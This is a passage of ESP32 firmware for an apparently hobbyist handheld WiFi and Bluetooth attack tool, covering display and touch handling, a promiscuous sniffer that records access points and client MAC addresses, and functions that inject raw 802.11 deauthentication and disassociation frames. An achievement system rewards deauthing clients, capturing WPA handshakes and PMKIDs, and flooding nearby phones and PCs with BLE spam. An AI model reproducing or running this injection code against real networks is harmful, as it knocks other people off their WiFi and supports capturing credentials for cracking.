    if (gap > 0) tft.fillRect(0, TOP_BAR_H+sprH, DISPLAY_W, gap, colorBG());
  }

  // ── Bottom bar (always direct, after sprite push so it's on top) ────────────
  drawBottomBar();
}

void showBootSplash() {
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(colorFG(), colorBG());

  // Screen 1: OINK OINK
  tft.fillScreen(colorBG());
  tft.setTextSize(5);
  tft.drawString("OINK", DISPLAY_W/2, DISPLAY_H/2 - 30);
  tft.drawString("OINK", DISPLAY_W/2, DISPLAY_H/2 + 30);
  delay(900);

  // Screen 2: MY NAME IS
  tft.fillScreen(colorBG());
  tft.setTextSize(3);
  tft.drawString("MY NAME IS", DISPLAY_W/2, DISPLAY_H/2);
  delay(900);

  // Screen 3: PORKCHOP
  tft.fillScreen(colorBG());
  tft.setTextSize(4);
  tft.drawString("PORKCHOP", DISPLAY_W/2, DISPLAY_H/2 - 25);
  tft.setTextSize(1);
  tft.drawString("BASICALLY YOU, BUT AS AN ASCII PIG.", DISPLAY_W/2, DISPLAY_H/2 + 20);
  tft.drawString("IDENTITY CRISIS EDITION.", DISPLAY_W/2, DISPLAY_H/2 + 38);
  delay(1200);

  // Clear to theme BG so main loop draws clean over the splash
  tft.fillScreen(colorBG());
  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
}

} // namespace Display

// ============================================================
// TOUCH INPUT — tap/hold zones for CYD navigation
// ============================================================
namespace Touch {

#define TOUCH_HOLD_MS   800
#define TOUCH_DEBOUNCE  150

uint32_t touchStart = 0;
bool touching = false;
bool holdFired = false;
int lastTX = 0, lastTY = 0;

// Map raw touch coords to screen coords (calibrate per unit if needed)
// These values are for typical Elegoo CYD units — adjust if needed
#define T_XMIN 340
#define T_XMAX 3800
#define T_YMIN 250
#define T_YMAX 3750

bool getPoint(int& sx, int& sy) {
  if (!touch.tirqTouched() && !touch.touched()) return false;
  TS_Point p = touch.getPoint();
  // Map to screen (landscape, rotation=1)
  sx = map(p.x, T_XMIN, T_XMAX, 0, DISPLAY_W);
  sy = map(p.y, T_YMIN, T_YMAX, 0, DISPLAY_H);
  sx = constrain(sx, 0, DISPLAY_W-1);
  sy = constrain(sy, 0, DISPLAY_H-1);
  return true;
}

// Returns: 0=none, 1=tap, 2=hold
uint8_t update(int& tx, int& ty) {
  int sx, sy;
  bool isTouched = getPoint(sx, sy);

  if (isTouched) {
    if (!touching) {
      touching = true;
      holdFired = false;
      touchStart = millis();
      lastTX = sx; lastTY = sy;
    }
    tx = sx; ty = sy;
    if (!holdFired && millis() - touchStart >= TOUCH_HOLD_MS) {
      holdFired = true;
      return 2;  // hold
    }
  } else {
    if (touching) {
      touching = false;
      if (!holdFired && millis() - touchStart >= TOUCH_DEBOUNCE) {
        tx = lastTX; ty = lastTY;
        return 1;  // tap
      }
    }
  }
  return 0;
}

} // namespace Touch

// ============================================================
// NETWORKRECON — shared promiscuous WiFi sniffer engine
// Faithful port of src/core/network_recon.cpp
// ============================================================
namespace NetworkRecon {

// DetectedNetwork is defined at global scope (before Display)
using ::DetectedNetwork;

typedef void (*PacketCallback)(wifi_promiscuous_pkt_t*, wifi_promiscuous_pkt_type_t);
typedef void (*NewNetworkCallback)(wifi_auth_mode_t, bool, const char*, int8_t, uint8_t);

static bool _running  = false;
static bool _paused   = false;
static uint8_t _channel = 1;
static uint8_t _chanIdx = 0;
static uint32_t _lastHop = 0;
static uint32_t _lastClean = 0;
static portMUX_TYPE _mux = portMUX_INITIALIZER_UNLOCKED;
static bool _chanLocked = false;
static uint8_t _lockedCh = 0;
static std::atomic<uint32_t> _pktCount{0};

static const uint8_t CH_ORDER[] = {1,6,11,2,3,4,5,7,8,9,10,12,13};
#define RECON_CH_COUNT 13
#define MAX_RECON_NETS 40
#define HOP_INTERVAL_MS 300
#define RECON_STALE_MS 60000

std::vector<DetectedNetwork> _nets;
static PacketCallback    _modeCb  = nullptr;
static NewNetworkCallback _newNetCb = nullptr;

// Pending-new-network ring (no malloc in callback)
#define PENDING_NET_SLOTS 8
static DetectedNetwork _pending[PENDING_NET_SLOTS];
static volatile uint8_t _pendW = 0, _pendR = 0;

// ── Client tracking ─────────────────────────────────────────
// Per-AP client table: up to 6 STAs per AP, 20 APs max
// ISR-safe: written in callback, read in main thread under _mux
struct ClientEntry {
  uint8_t  apBssid[6];
  uint8_t  staMac[CLIENT_MAX_PER_AP][6];
  uint8_t  count;        // 0-6
  uint32_t lastSeen;
};
static ClientEntry _clients[CLIENT_AP_SLOTS];
static uint8_t     _clientSlots = 0;  // used slots

// Find or create client entry for an AP (call under _mux)
static ClientEntry* _getClientEntry(const uint8_t* apBssid) {
  for (uint8_t i=0; i<_clientSlots; i++)
    if (memcmp(_clients[i].apBssid, apBssid, 6)==0) return &_clients[i];
  if (_clientSlots < CLIENT_AP_SLOTS) {
    ClientEntry& e = _clients[_clientSlots++];
    memcpy(e.apBssid, apBssid, 6);
    e.count = 0; e.lastSeen = 0;
    return &e;
  }
  // Evict oldest entry
  uint8_t oldest = 0;
  for (uint8_t i=1; i<CLIENT_AP_SLOTS; i++)
    if (_clients[i].lastSeen < _clients[oldest].lastSeen) oldest=i;
  ClientEntry& e = _clients[oldest];
  memcpy(e.apBssid, apBssid, 6);
  e.count = 0; e.lastSeen = 0;
  return &e;
}

// Add or refresh a STA in an AP's client list (call under _mux)
static void _trackClient(const uint8_t* apBssid, const uint8_t* staMac) {
  // Ignore broadcast / multicast
  if (staMac[0] & 0x01) return;
  // Ignore zero MACs
  bool allZero = true;
  for (int i=0;i<6;i++) if(staMac[i]) { allZero=false; break; }
  if (allZero) return;
  // Ignore if same as AP (AP transmitting to itself)
  if (memcmp(apBssid, staMac, 6)==0) return;

  ClientEntry* e = _getClientEntry(apBssid);
  e->lastSeen = millis();
  // Already tracked?
  for (uint8_t i=0; i<e->count; i++)
    if (memcmp(e->staMac[i], staMac, 6)==0) return;
  // Add if room
  if (e->count < CLIENT_MAX_PER_AP)
    memcpy(e->staMac[e->count++], staMac, 6);
}

// Public: get client MACs for an AP — copies into caller buffer
// Returns count (0-6). buf must hold maxCount*6 bytes.
uint8_t getClients(const uint8_t* apBssid, uint8_t* buf, uint8_t maxCount) {
  taskENTER_CRITICAL(&_mux);
  uint8_t n = 0;
  for (uint8_t i=0; i<_clientSlots; i++) {
    if (memcmp(_clients[i].apBssid, apBssid, 6)==0) {
      n = _clients[i].count < maxCount ? _clients[i].count : maxCount;
      memcpy(buf, _clients[i].staMac, n*6);
      break;
    }
  }
  taskEXIT_CRITICAL(&_mux);
  return n;
}


static inline int8_t _emaRssi(int8_t prev, int8_t s) {
  if (!prev) return s;
  return (int8_t)(((int16_t)prev*3 + s) / 4);
}

static int IRAM_ATTR _findNetByBssid(const uint8_t* b) {
  for (int i=0; i<(int)_nets.size(); i++)
    if (memcmp(_nets[i].bssid, b, 6)==0) return i;
  return -1;
}

static void IRAM_ATTR _processBeacon(const uint8_t* p, uint16_t len, int8_t rssi) {
  if (len<36) return;
  const uint8_t* bssid = p+16;
  uint32_t now = millis();
  taskENTER_CRITICAL(&_mux);
  int idx = _findNetByBssid(bssid);
  if (idx>=0) {
    _nets[idx].rssi = rssi;
    _nets[idx].rssiAvg = _emaRssi(_nets[idx].rssiAvg, rssi);
    _nets[idx].lastSeen = now;
    _nets[idx].beaconCount++;
    if (_nets[idx].lastBeaconSeen>0) {
      uint32_t d = now-_nets[idx].lastBeaconSeen;
      if (d>0&&d<5000) {
        _nets[idx].beaconIntervalEmaMs = _nets[idx].beaconIntervalEmaMs
          ? (uint16_t)((_nets[idx].beaconIntervalEmaMs*7+d)/8) : (uint16_t)d;
      }
    }
    _nets[idx].lastBeaconSeen = now;
    taskEXIT_CRITICAL(&_mux);
    return;
  }
  taskEXIT_CRITICAL(&_mux);
  // Queue new network (ring buffer - no alloc)
  uint8_t nw = (_pendW+1)%PENDING_NET_SLOTS;
  if (nw == _pendR) return;
  DetectedNetwork& net = _pending[_pendW];
  memset(&net, 0, sizeof(net));
  memcpy(net.bssid, bssid, 6);
  net.rssi = rssi; net.rssiAvg = rssi;
  net.channel = _channel;
  net.firstSeen = net.lastSeen = net.lastBeaconSeen = now;
  net.beaconCount = 1;
  // Parse SSID + capabilities IEs
  uint16_t off = 36;
  while (off+2 < len) {
    uint8_t id=p[off], il=p[off+1];
    if (off+2+il > len) break;
    if (id==0 && il>0 && il<=32) {
      memcpy(net.ssid, p+off+2, il); net.ssid[il]=0;
      bool allNull=true;
      for(int i=0;i<il;i++) if(net.ssid[i]){allNull=false;break;}
      if(allNull) { net.ssid[0]=0; net.isHidden=true; }
    }
    if (id==3 && il==1) net.channel = p[off+2];
    if (id==0x30 && il>=2) {
      net.authmode = WIFI_AUTH_WPA2_PSK;
      // Check PMF (RSN capabilities byte 0, bit 6=MFPR, bit 7=MFPC)
      if (il>=10) net.hasPMF = (p[off+2+8] & 0xC0) ? true : false;
    }
    if (id==0xDD && il>=8 && p[off+2]==0x00&&p[off+3]==0x50&&p[off+4]==0xF2&&p[off+5]==0x01) {
      if (net.authmode != WIFI_AUTH_WPA2_PSK) net.authmode = WIFI_AUTH_WPA_PSK;
      else net.authmode = WIFI_AUTH_WPA_WPA2_PSK;
    }
    off += 2+il;
  }
  _pendW = nw;
}

static void IRAM_ATTR _promiscCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!buf || !_running || _paused) return;
  auto* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint16_t len = pkt->rx_ctrl.sig_len;
  if (len>4) len-=4;
  if (len<24) return;
  _pktCount.fetch_add(1, std::memory_order_relaxed);
  const uint8_t* p = pkt->payload;
  if (type==WIFI_PKT_MGMT) {
    uint8_t sub = (p[0]>>4)&0x0F;
    if (sub==0x08) _processBeacon(p, len, pkt->rx_ctrl.rssi);
  }
  // Data frame: track STA→AP direction to discover clients + update lastDataSeen
  if (type==WIFI_PKT_DATA && len>=24) {
    uint16_t fc = ((uint16_t)p[1]<<8)|p[0];
    bool toDS   = (fc>>8)&1;
    bool fromDS = (fc>>9)&1;
    // toDS=1 fromDS=0: STA→AP — addr1=BSSID, addr2=STA
    if (toDS && !fromDS) {
      const uint8_t* apBssid = p+4;   // addr1
      const uint8_t* staMac  = p+10;  // addr2
      // Update lastDataSeen on the AP's network entry
      portENTER_CRITICAL_ISR(&_mux);
      for (int i=0;i<(int)_nets.size();i++) {
        if (memcmp(_nets[i].bssid, apBssid, 6)==0) {
          _nets[i].lastDataSeen = millis();
          break;
        }
      }
      _trackClient(apBssid, staMac);
      portEXIT_CRITICAL_ISR(&_mux);
    }
    // fromDS=1 toDS=0: AP→STA — addr1=STA, addr2=BSSID
    else if (!toDS && fromDS) {
      const uint8_t* apBssid = p+10;  // addr2
      const uint8_t* staMac  = p+4;   // addr1
      portENTER_CRITICAL_ISR(&_mux);
      for (int i=0;i<(int)_nets.size();i++) {
        if (memcmp(_nets[i].bssid, apBssid, 6)==0) {
          _nets[i].lastDataSeen = millis();
          break;
        }
      }
      _trackClient(apBssid, staMac);
      portEXIT_CRITICAL_ISR(&_mux);
    }
  }
  if (_modeCb) _modeCb(pkt, type);
}

static void _processPending() {
  uint8_t n=0;
  while (n++<4 && _pendR!=_pendW) {
    DetectedNetwork& p = _pending[_pendR];
    _pendR = (_pendR+1)%PENDING_NET_SLOTS;
    taskENTER_CRITICAL(&_mux);
    bool exists = (_findNetByBssid(p.bssid)>=0);
    if (!exists && (int)_nets.size()<MAX_RECON_NETS) _nets.push_back(p);
    taskEXIT_CRITICAL(&_mux);
    if (!exists && _newNetCb)
      _newNetCb(p.authmode, p.isHidden, p.ssid, p.rssi, p.channel);
  }
}

void resume(); // forward decl — defined below

void start() {
  if (_running) { if(_paused){resume();} return; }
  _nets.clear(); _nets.reserve(MAX_RECON_NETS);
  _pendW=_pendR=0; _channel=1; _chanIdx=0; _chanLocked=false; _pktCount=0;
  WiFi.persistent(false); WiFi.setSleep(false); WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(50);
  esp_wifi_set_promiscuous_rx_cb(_promiscCb);
  esp_wifi_set_promiscuous_filter(nullptr);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
  _running=true; _paused=false; _lastHop=_lastClean=millis();
  Serial.println("[RECON] started");
}

void stop() {
  if (!_running) return;
  _running=false; _paused=false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  Serial.printf("[RECON] stopped nets=%d\n", (int)_nets.size());
}

void pause() {
  if (!_running||_paused) return;
  _paused=true;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
}

void resume() {
  if (!_running||!_paused) return;
  WiFi.disconnect(); delay(30);
  esp_wifi_set_promiscuous_rx_cb(_promiscCb);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
  _paused=false; _lastHop=millis();
}

void update() {
  if (!_running||_paused) return;
  uint32_t now=millis();
  _processPending();
  if (!_chanLocked && now-_lastHop>HOP_INTERVAL_MS) {
    _chanIdx = (_chanIdx+1)%RECON_CH_COUNT;
    _channel = CH_ORDER[_chanIdx];
    esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
    _lastHop=now;
  }
  if (now-_lastClean>5000) {
    taskENTER_CRITICAL(&_mux);
    for (int i=(int)_nets.size()-1;i>=0;i--)
      if (now-_nets[i].lastSeen>RECON_STALE_MS && !_nets[i].isTarget)
        _nets.erase(_nets.begin()+i);
    taskEXIT_CRITICAL(&_mux);
    _lastClean=now;
  }
}

bool isRunning()    { return _running && !_paused; }
bool isPaused()     { return _running && _paused; }
uint8_t getChannel(){ return _channel; }
uint32_t getPacketCount() { return _pktCount.load(); }

std::vector<DetectedNetwork>& getNetworks() { return _nets; }
uint16_t getNetworkCount() { return (uint16_t)_nets.size(); }

int findNetworkIndex(const uint8_t* bssid) {
  taskENTER_CRITICAL(&_mux);
  int idx = _findNetByBssid(bssid);
  taskEXIT_CRITICAL(&_mux);
  return idx;
}

void lockChannel(uint8_t ch) {
  if(ch>=1&&ch<=14){_lockedCh=ch;_channel=ch;_chanLocked=true;esp_wifi_set_channel(ch,WIFI_SECOND_CHAN_NONE);}
}
void unlockChannel()  { _chanLocked=false; }
bool isChannelLocked(){ return _chanLocked; }
// setChannel: change channel without locking (for external hop loops)
void setChannel(uint8_t ch) {
  if(ch>=1&&ch<=14&&!_chanLocked){_channel=ch;esp_wifi_set_channel(ch,WIFI_SECOND_CHAN_NONE);}
}
// hopChannelTo: alias used by OINK hop loop
void hopChannelTo(uint8_t ch) { setChannel(ch); }


void setPacketCallback(PacketCallback cb)        { _modeCb=cb; }
void setNewNetworkCallback(NewNetworkCallback cb) { _newNetCb=cb; }

void enterCritical() { taskENTER_CRITICAL(&_mux); }
void exitCritical()  { taskEXIT_CRITICAL(&_mux);  }

} // namespace NetworkRecon

// ============================================================
// SHARED CAPTURE TYPES — used by OINK and DNH
// ============================================================
// ============================================================
// WSL BYPASSER — raw 802.11 frame TX (deauth/disassoc)
// Overrides esp-idf sanity check to allow raw management frames
// ============================================================
// esp32 arduino core 3.x: ieee80211_raw_frame_sanity_check is in ROM and cannot be
// overridden via extern "C" (causes multiple definition linker error).
// Raw frame injection still works via esp_wifi_80211_tx() without the override —
// the sanity check is only enforced on the TX path for management frames in some
// configurations. If injection fails silently, add -Wl,--wrap to build flags.
// No override needed here.

namespace WSLBypasser {

// Deauth: reason 7 = class 3 frame from non-associated STA
bool sendDeauthFrame(const uint8_t* bssid, uint8_t ch, const uint8_t* sta, uint8_t reason=7) {
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  uint8_t pkt[26] = {
    0xC0,0x00, 0x00,0x00,       // FC=deauth, duration=0
    0,0,0,0,0,0,                 // DA (client or broadcast)
    0,0,0,0,0,0,                 // SA (BSSID)
    0,0,0,0,0,0,                 // BSSID
    0x00,0x00,                   // SeqCtrl
    reason,0x00                  // reason code
  };
  memcpy(pkt+4,  sta,   6);
  memcpy(pkt+10, bssid, 6);
  memcpy(pkt+16, bssid, 6);
  return esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false) == ESP_OK;
}

// Disassoc: reason 8 = station leaving BSS
bool sendDisassocFrame(const uint8_t* bssid, uint8_t ch, const uint8_t* sta, uint8_t reason=8) {
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  uint8_t pkt[26] = {
    0xA0,0x00, 0x00,0x00,       // FC=disassoc
    0,0,0,0,0,0,
    0,0,0,0,0,0,
    0,0,0,0,0,0,
    0x00,0x00, reason,0x00
  };
  memcpy(pkt+4,  sta,   6);
  memcpy(pkt+10, bssid, 6);
  memcpy(pkt+16, bssid, 6);
  return esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false) == ESP_OK;
}

// Generate a random locally-administered MAC for injection
void randomMAC(uint8_t* mac) {
  for(int i=0;i<6;i++) mac[i]=(uint8_t)esp_random();
  mac[0] = (mac[0]&0xFE)|0x02; // locally administered, unicast
}

} // namespace WSLBypasser

// ============================================================
// XP SYSTEM — RPG progression, 50 levels, 60 achievements
// Faithful port of src/core/xp.cpp
// ============================================================

// Global achievement table (extern declared above Display)
const AchDef ACH_LIST[] = {
  {ACH_FIRST_BLOOD,    "F1RST BL00D",       "Capture your first handshake"},
  {ACH_CENTURION,      "C3NTUR10N",         "100 networks in one session"},
  {ACH_GHOST_HUNTER,   "GH0ST HUNT3R",      "Find 10 hidden networks"},
  {ACH_APPLE_FARMER,   "4PPLE FARM3R",      "Send 100 Apple BLE packets"},
  {ACH_WARDRIVER,      "WARDR1V3R",         "Log 1000 lifetime networks"},
  {ACH_DEAUTH_KING,    "D3AUTH K1NG",       "100 successful deauths"},
  {ACH_PMKID_HUNTER,   "PMK1D HUNT3R",      "Capture a PMKID"},
  {ACH_WPA3_SPOTTER,   "WPA3 SP0TT3R",      "Find a WPA3 network"},
  {ACH_SILICON_PSYCHO, "S1L1C0N PSYCH0",    "Log 5000 lifetime networks"},
  {ACH_SPEED_RUN,      "SP33D RUN",         "50 networks in 10 minutes"},
  {ACH_CHAOS_AGENT,    "CH40S AG3NT",       "1000 BLE packets sent"},
  {ACH_NIETZSWINE,     "N13TZSCH3",         "Stare into spectrum 15 min"},
  {ACH_TEN_THOUSAND,   "T3N THOU$AND",      "10000 lifetime networks"},
  {ACH_NEWB_SNIFFER,   "N3WB SNIFFER",      "Find your first 10 networks"},
  {ACH_FIVE_HUNDRED,   "500 P1GS",          "500 networks in session"},
  {ACH_OPEN_SEASON,    "OPEN S3ASON",       "Find 50 open networks"},
  {ACH_WEP_LOLZER,     "WEP L0LZER",        "Find a WEP network"},
  {ACH_HANDSHAKE_HAM,  "HANDSHAK3 HAM",     "10 handshakes lifetime"},
  {ACH_FIFTY_SHAKES,   "F1FTY SHAKES",      "50 handshakes lifetime"},
  {ACH_PMKID_FIEND,    "PMK1D F1END",       "Capture 10 PMKIDs"},
  {ACH_TRIPLE_THREAT,  "TR1PLE THREAT",     "3 handshakes in session"},
  {ACH_HOT_STREAK,     "H0T STREAK",        "5 handshakes in session"},
  {ACH_FIRST_DEAUTH,   "F1RST D3AUTH",      "Your first successful deauth"},
  {ACH_DEAUTH_THOUSAND,"DEAUTH TH0USAND",   "1000 successful deauths"},
  {ACH_RAMPAGE,        "R4MPAGE",           "10 deauths in session"},
  {ACH_GPS_ADDICT,     "GPS 4DD1CT",        "500 GPS-tagged networks"},
  {ACH_PARANOID_ANDROID,"PARANOID ANDR01D", "100 Android BLE spam"},
  {ACH_SAMSUNG_SPRAY,  "SAMSUNG SPR4Y",     "100 Samsung BLE spam"},
  {ACH_WINDOWS_PANIC,  "W1ND0WS PANIC",     "100 Windows BLE spam"},
  {ACH_BLE_BOMBER,     "BLE B0MBER",        "5000 BLE packets total"},
  {ACH_OINKAGEDDON,    "OINK4GEDDON",       "10000 BLE packets total"},
  {ACH_SESSION_VET,    "SESS10N V3T",       "Complete 100 sessions"},
  {ACH_FOUR_HOUR_GRIND,"4 HOUR GR1ND",      "4hr continuous session"},
  {ACH_EARLY_BIRD,     "EARLY B1RD",        "Hunt between 5-7am"},
  {ACH_WPA3_HUNTER,    "WPA3 HUNT3R",       "Find 25 WPA3 networks"},
  {ACH_MAX_LEVEL,      "MAX L3VEL",         "Reach level 50"},
  {ACH_ABOUT_JUNKIE,   "AB0UT_JUNK13",      "Visit About screen 5 times"},
  {ACH_GOING_DARK,     "G01NG D4RK",        "5 min in passive mode"},
  {ACH_GHOST_PROTOCOL, "GH0ST PR0T0C0L",    "30min passive + 50 nets"},
  {ACH_SHADOW_BROKER,  "SH4D0W BR0K3R",     "500 passive networks"},
  {ACH_SILENT_ASSASSIN,"S1L3NT 4SS4SS1N",   "First passive PMKID"},
  {ACH_PROPHECY_WITNESS,"PR0PH3CY W1TN3SS", "Unlock a secret phrase"},
  {ACH_QUICK_DRAW,     "QU1CK_DR4W",        "Deauth 5 clients in 30s in SPECTRUM"},
  {ACH_DEAD_EYE,       "D34D_3Y3",          "Deauth within 2s of entering monitor"},
  {ACH_HIGH_NOON,      "H1GH_N00N",         "Deauth a client at 12pm exactly"},
  {ACH_FULL_CLEAR,     "TH3_C0MPL3T10N1ST", "Unlock all achievements"},
};
const uint8_t ACH_COUNT = sizeof(ACH_LIST)/sizeof(ACH_LIST[0]);

// Forward declarations — Challenges is defined after XP, but XP::gain() calls into it
namespace Challenges {
  void generate();
  void onXPEvent(XPEvent ev);
}

namespace XP {

static const uint16_t XP_VALS[] = {1,3,10,3,5, 50,75,1,15, 1,2,1,1,1, 5,75,1,1};

static const uint32_t XP_THRESH[50] = {
  0,100,300,600,1000,1500,2300,3400,5000,7000,
  9500,12500,16000,20000,25000,31000,38000,46000,55000,65000,
  76000,88000,101000,115000,130000,146000,163000,181000,200000,220000,
  241000,263000,286000,310000,335000,361000,388000,416000,445000,475000,
  506000,538000,571000,605000,640000,676000,713000,751000,790000,830000
};

static const char* TITLES[50] = {
  "BACON N00B","0INK Z3R0","SCRIP7 H4M","P1N6 P1GL3T","NMAP NIBBL3",
  "PR0B3 P0RK","CH4N CH0P","B34C0N B0AR","SS1D SN0UT","P4CK3T PR0D",
  "4SS0C SW1N3","EAP0L E4T3R","PMK1D P1CK3R","R5N R4Z0R","C4PTUR3 C00K",
  "D34UTH DU3L","0FFCH4N 0PS","M1TM MUDP1G","1NJ3CT J0K3","5P00F CH3F",
  "SAE S1ZZL3","PMF SH13LD","TR4NS1T TR0T","6GHZ GR1NT","0WE 0NK",
  "C3RT CH0MP","EAP-TLS TUSK","R4D10 R4NG3R","R04M M4ST3R","EHT BR15TL3",
  "FR4G 4TT4CK","KR4CK CRU5H","DR4G0NBL00D","C0R3DUMP P1G","R00TK1T R1ND",
  "PHR4CK P1G","2600 B0AR","BLU3B0X H4M","C0NS0L3 C0W","0xDE4D B4C0N",
  "SPRAWL PR0XY","N3UR0 N0S3","ICEBR34K B0AR","D3CK D1V3R","C0RP N3TW0RK",
  "K3RN3L H0G","SYSC4LL SW1N","NULL M4TR1X","R00T 0F R00T","B4C0NM4NC3R"
};

static uint32_t _totalXP   = 0;
static uint32_t _lNets     = 0;
static uint32_t _lHS       = 0;
static uint32_t _lPMKID    = 0;
static uint32_t _lDeauth   = 0;
static uint16_t _sessions  = 0;
static uint8_t  _level     = 1;
static uint32_t _sessionXP = 0;
static bool     _inited    = false;
static uint32_t _lastGainMs = 0;
static uint32_t _unlockBits = 0;
static uint16_t _lastGainAmt = 0;
static Preferences _xpPrefs;

// ── Achievement bitfield (uint64_t — 64 achievements) ─────────────────────
// (PorkAchievement, AchDef, ACH_LIST, ACH_COUNT defined at global scope above namespace XP)
static uint64_t _achBits = 0;
static uint8_t  _sessionHS = 0;
static uint8_t  _sessionDeauth = 0;
static uint32_t _sessionNets = 0;
static uint32_t _bleTotal = 0;
static uint32_t _sessionStartMs = 0;
static uint32_t _firstNetMs = 0;        // When first network found this session (for SPEED_RUN)
static bool     _nightOwlAwarded = false;    // ACH_NIGHT_OWL checked this session
static bool     _earlyBirdAwarded = false;   // ACH_EARLY_BIRD checked this session
static bool     _weekendWarriorAwarded = false; // ACH_WEEKEND_WARRIOR checked this session
static uint8_t  _aboutVisits = 0;

static uint8_t _calcLevel(uint32_t xp) {
  for (uint8_t l=49; l>0; l--)
    if (xp >= XP_THRESH[l]) return l+1;
  return 1;
}

void init() {
  if (_inited) return;
  _xpPrefs.begin("xp", true);
  _totalXP  = _xpPrefs.getUInt("xp",0);
  _lNets    = _xpPrefs.getUInt("nets",0);
  _lHS      = _xpPrefs.getUInt("hs",0);
  _lPMKID   = _xpPrefs.getUInt("pmkid",0);
  _lDeauth  = _xpPrefs.getUInt("deauth",0);
  _sessions = _xpPrefs.getUShort("sess",0);
  _unlockBits = _xpPrefs.getUInt("unlk",0);
  _achBits    = ((uint64_t)_xpPrefs.getUInt("ach_hi",0)<<32) | _xpPrefs.getUInt("ach_lo",0);
  _bleTotal   = _xpPrefs.getUInt("ble",0);
  _xpPrefs.end();
  _sessionStartMs = millis();
  _firstNetMs = 0;
  _nightOwlAwarded = false;
  _earlyBirdAwarded = false;
  _weekendWarriorAwarded = false;
  _level = _calcLevel(_totalXP);
  _sessions++;
  _sessionXP = 0;
  _inited = true;
  Serial.printf("[XP] lvl=%d total=%lu\n", _level, _totalXP);
}

void save() {
  _xpPrefs.begin("xp",false);
  _xpPrefs.putUInt("xp",_totalXP); _xpPrefs.putUInt("nets",_lNets);
  _xpPrefs.putUInt("hs",_lHS);     _xpPrefs.putUInt("pmkid",_lPMKID);
  _xpPrefs.putUInt("deauth",_lDeauth); _xpPrefs.putUShort("sess",_sessions);
  _xpPrefs.putUInt("unlk",_unlockBits);
  _xpPrefs.putUInt("ach_lo",(uint32_t)(_achBits & 0xFFFFFFFF));
  _xpPrefs.putUInt("ach_hi",(uint32_t)(_achBits >> 32));
  _xpPrefs.putUInt("ble",_bleTotal);
  _xpPrefs.end();
}

void gain(XPEvent ev) {
  if (!_inited) init();
  uint16_t amt = (ev < 18) ? XP_VALS[ev] : 1;
  uint8_t oldL = _level;
  _totalXP += amt; _sessionXP += amt;
  _level = _calcLevel(_totalXP);
  _lastGainMs = millis(); _lastGainAmt = amt;
  if (_level > oldL) {
    char buf[40]; snprintf(buf,sizeof(buf),"LEVEL UP! LVL %d",_level);
    Display::showToast(buf, 3000);
    Avatar::cuteJump();
    Challenges::generate();  // pig wakes with new demands each level
    Mood::resetChallengeHype();
  }
  Challenges::onXPEvent(ev);  // forward every event to challenge tracker
}

static void checkAchievements(); // forward decl — defined below

void addNet()    {
  _lNets++; _sessionNets++;
  if (_firstNetMs == 0) _firstNetMs = millis();  // Record first net time for SPEED_RUN
  gain(NETWORK_FOUND);
  checkAchievements();
}
void addHS()     { _lHS++;  _sessionHS++;   gain(HANDSHAKE_CAPTURED); checkAchievements(); }
void addPMKID()  { _lPMKID++;               gain(PMKID_CAPTURED);     checkAchievements(); }
void addDeauth() { _lDeauth++; _sessionDeauth++; gain(DEAUTH_SENT);   checkAchievements(); }
void addWarhog() { gain(WARHOG_LOGGED); }
void addBLE(uint8_t kind) {
  if(kind==0) gain(BLE_APPLE);
  else if(kind==1) gain(BLE_ANDROID);
  else if(kind==2) gain(BLE_SAMSUNG);
  else gain(BLE_WINDOWS);
  _bleTotal++; checkAchievements();
}

uint8_t  getLevel()    { return _level; }
uint32_t getTotalXP()  { return _totalXP; }
uint32_t getSessionXP(){ return _sessionXP; }
uint16_t getSessions() { return _sessions; }
uint32_t getLNets()    { return _lNets; }
uint32_t getLHS()      { return _lHS; }
uint32_t getLPMKID()   { return _lPMKID; }
uint32_t getLDeauth()  { return _lDeauth; }
uint32_t getUnlockables()               { return _unlockBits; }
bool     hasUnlockable(uint8_t bit)     { return (_unlockBits & (1UL<<bit)) != 0; }
void     setUnlockable(uint8_t bit)     { _unlockBits |= (1UL<<bit); save();
  // Unlock PROPHECY achievement when any secret phrase unlocked
  _achBits |= (uint64_t)ACH_PROPHECY_WITNESS; }

// ── Achievement API ───────────────────────────────────────────────────────
bool     hasAchievement(PorkAchievement a) { return (_achBits & (uint64_t)a) != 0; }
uint64_t getAchievements()             { return _achBits; }
uint8_t  getAchievementCount() {
  uint64_t b=_achBits; uint8_t c=0;
  while(b){c+=b&1;b>>=1;} return c;
}

void unlockAchievement(PorkAchievement a) {
  if (_achBits & (uint64_t)a) return; // already have it
  _achBits |= (uint64_t)a;
  // Find name for toast
  for (uint8_t i=0;i<ACH_COUNT;i++) {
    if (ACH_LIST[i].flag == a) {
      char buf[40]; snprintf(buf,sizeof(buf),"ACH: %s",ACH_LIST[i].name);
      Display::showToast(buf, 3500);
      Avatar::cuteJump();
      gain(NETWORK_FOUND); // small bonus XP for achievement
      break;
    }
  }
  // Check FULL_CLEAR
  bool allDone=true;
  for(uint8_t i=0;i<ACH_COUNT;i++)
    if(ACH_LIST[i].flag!=ACH_FULL_CLEAR && !(_achBits&(uint64_t)ACH_LIST[i].flag)){allDone=false;break;}
  if(allDone) { _achBits|=(uint64_t)ACH_FULL_CLEAR; Display::showToast("FULL CLEAR! TH3_C0MPL3T10N1ST",4000); }
}

// ── Auto-check achievements ────────────────────────────────────────────────
// Called from addHS/addPMKID/addDeauth/addNet etc.
void checkAchievements() {
  uint32_t now=millis();
  uint32_t sessionMs=now-_sessionStartMs;
  // Network count achievements
  if(_sessionNets>=10)   unlockAchievement(ACH_NEWB_SNIFFER);
  if(_sessionNets>=100)  unlockAchievement(ACH_CENTURION);
  if(_sessionNets>=500)  unlockAchievement(ACH_FIVE_HUNDRED);
